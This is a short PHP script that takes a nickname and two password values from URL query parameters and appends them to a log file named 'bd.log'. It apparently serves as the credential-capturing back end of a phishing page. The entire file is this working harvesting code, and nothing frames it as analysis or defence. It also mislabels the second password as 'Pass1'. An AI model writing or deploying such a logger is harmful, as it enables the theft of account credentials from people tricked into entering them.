<?php
$nik = $_GET['nik'];
$pas1s = $_GET['pass1'];
$pas2s = $_GET['pass2'];
$f = fopen("bd.log", "a+");
fwrite($f, "\r\nNik: $nik / Pass1: $pas1s / Pass1: $pas2s");
fclose($f);
?>
